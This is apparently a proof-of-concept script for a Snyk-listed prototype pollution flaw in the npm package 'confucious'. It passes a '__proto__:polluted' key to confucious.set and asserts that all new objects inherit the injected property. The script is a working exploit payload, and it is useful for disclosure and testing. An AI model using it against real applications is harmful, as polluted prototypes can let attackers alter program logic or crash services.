//https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665

const confucious = require('confucious');
const assert = require('assert');
var obj = {}
console.log("Before : " + obj.polluted);
confucious.set('__proto__:polluted', "yes");
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");